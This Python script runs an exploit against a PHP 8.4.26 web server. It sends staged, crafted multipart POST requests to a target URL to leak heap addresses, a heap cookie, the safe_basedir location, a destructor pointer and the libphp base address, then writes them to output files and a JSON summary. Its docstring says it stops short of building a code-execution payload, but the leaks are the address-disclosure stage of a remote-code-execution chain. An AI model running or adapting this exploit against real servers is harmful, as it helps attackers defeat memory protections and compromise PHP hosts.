#!/usr/bin/env python3
"""Run the two HTTP disclosures only; never build or send an RCE carrier."""

from __future__ import annotations

import argparse
import dataclasses
import json
from pathlib import Path
import sys
import time


HERE = Path(__file__).resolve().parent
sys.path.insert(0, str(HERE))

import exploit_generic as exploit  # noqa: E402


def main() -> int:
    parser = argparse.ArgumentParser()
    parser.add_argument("--url", required=True)
    parser.add_argument("--host-header")
    parser.add_argument("--profile-json")
    parser.add_argument("--set", action="append", default=[], dest="assignments")
    parser.add_argument("--output-dir", required=True, type=Path)
    args = parser.parse_args()

    profile = exploit.load_profile(
        "php-8.4.26-amd64", args.profile_json, args.assignments
    )
    target = exploit.Target.parse(args.url)
    if args.host_header:
        target = dataclasses.replace(target, host_header=args.host_header)
    client = exploit.RawHTTP(
        target,
        timeout=90.0,
        retries=3,
        retry_delay=0.25,
        insecure=False,
        log=exploit.Log(1),
    )
    args.output_dir.mkdir(parents=True, exist_ok=True)

    def post(name: str, body: bytes, boundary: bytes, *, path: str | None = None,
             expected_abort: bool = False) -> bytes:
        response = client.post_multipart(
            body, boundary, path=path, expected_abort=expected_abort
        )
        (args.output_dir / f"{name}.response").write_bytes(response)
        first_line = response.splitlines()[0] if response else b""
        print(
            f"{name}: {first_line.decode('latin1', 'replace')} "
            f"bytes={len(response)}",
            flush=True,
        )
        return response

    body, boundary = exploit.build_off_a(profile)
    post("heap-a", body, boundary, expected_abort=True)
    body, boundary = exploit.build_heap_b(profile)
    heap_response = post("heap-b", body, boundary)
    cached, main_heap, heap_cookie = exploit.parse_heap_cookie(
        heap_response,
        profile,
        exploit.Log(1),
        False,
        attempt_label=" (PHP 8.3.21 calibration)",
    )
    (args.output_dir / "heap-cookie.bin").write_bytes(heap_cookie)
    print(f"heap cached={cached:#x} main={main_heap:#x}", flush=True)

    body, boundary = exploit.build_rotation_a(profile)
    post("rotate-a", body, boundary, expected_abort=True)
    time.sleep(0.2)
    body, boundary = exploit.build_rotation_b()
    post("rotate-b", body, boundary, expected_abort=True)
    time.sleep(0.5)

    body, boundary = exploit.build_off_a(profile)
    post("libphp-a", body, boundary, expected_abort=True)
    safe_basedir = main_heap + profile.safe_basedir_offset
    body, boundary, query = exploit.build_libphp_b(profile, safe_basedir)
    libphp_response = post(
        "libphp-b", body, boundary, path=target.path + query
    )
    destructor, libphp, libphp_cookie = exploit.parse_libphp_cookie(
        libphp_response, profile, exploit.Log(1), False
    )
    (args.output_dir / "libphp-cookie.bin").write_bytes(libphp_cookie)
    result = {
        "cached_heap": f"{cached:#x}",
        "main_heap": f"{main_heap:#x}",
        "safe_basedir": f"{safe_basedir:#x}",
        "pDestructor": f"{destructor:#x}",
        "libphp_base": f"{libphp:#x}",
        "status": "TWO_HTTP_LEAKS_OBSERVED",
    }
    (args.output_dir / "result.json").write_text(
        json.dumps(result, indent=2) + "\n"
    )
    print(json.dumps(result, indent=2))
    return 0


if __name__ == "__main__":
    raise SystemExit(main())
